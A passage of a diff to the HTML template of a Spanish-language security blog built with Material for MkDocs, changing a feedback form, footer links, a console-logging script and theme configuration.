 
 
 
+  
+  
 
 
 
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        ¿Te fue útil esta página?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="Sí, me ayudó" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m7 0c0 .8-.7 1.5-1.5 1.5S14 10.3 14 9.5 14.7 8 15.5 8s1.5.7 1.5 1.5m-5 7.73c-1.75 0-3.29-.73-4.19-1.81L9.23 14c.45.72 1.52 1.23 2.77 1.23s2.32-.51 2.77-1.23l1.42 1.42c-.9 1.08-2.44 1.81-4.19 1.81"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="Podría mejorar" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10m-6.5-4c.8 0 1.5.7 1.5 1.5s-.7 1.5-1.5 1.5-1.5-.7-1.5-1.5.7-1.5 1.5-1.5M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m2 4.5c1.75 0 3.29.72 4.19 1.81l-1.42 1.42C14.32 16.5 13.25 16 12 16s-2.32.5-2.77 1.23l-1.42-1.42C8.71 14.72 10.25 14 12 14"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              ¡Gracias por tu feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Gracias, intentaré mejorar el contenido.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
 
 
                 
+
               </article>
             </div>
           
@@ -700,20 +1900,39 @@
         
       </main>
       
+  
         <footer class="md-footer">
+  
+    
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
   
     <div class="md-copyright__highlight">
-      Copyright &copy; 2024-2026 0x574R | RAZOR Security Blog
+      Copyright &copy; 2024-2025 0x574R | RAZOR Security Blog
     </div>
   
   
-    Made with
-    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-      Material for MkDocs
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/0x574R" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="/feed_rss_created.xml" target="_blank" rel="noopener" title="RSS Feed" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M0 64c0-17.7 14.3-32 32-32 229.8 0 416 186.2 416 416 0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96 14.3 96 0 81.7 0 64m0 352a64 64 0 1 1 128 0 64 64 0 1 1-128 0m32-256c159.1 0 288 128.9 288 288 0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224-17.7 0-32-14.3-32-32s14.3-32 32-32"/></svg>
     </a>
   
 </div>
@@ -722,6 +1941,13 @@
   </div>
 </footer>
       
+  
+  <!-- Custom footer additions -->
+  <script>
+    // Add custom functionality if needed
+    console.log('%c[RAZOR] Blog loaded successfully', 'color: #00ff41; font-family: monospace;');
+  </script>
+
     </div>
     <div class="md-dialog" data-md-component="dialog">
       <div class="md-dialog__inner md-typeset"></div>
@@ -733,12 +1959,12 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.sections", "navigation.top", "toc.follow", "content.code.copy", "content.tabs.link", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "navigation.instant", "navigation.instant.progress", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
-        <script src="../../javascripts/header-title.js"></script>
+        <script src="../../javascripts/extra.js"></script>
       
     
   </body>
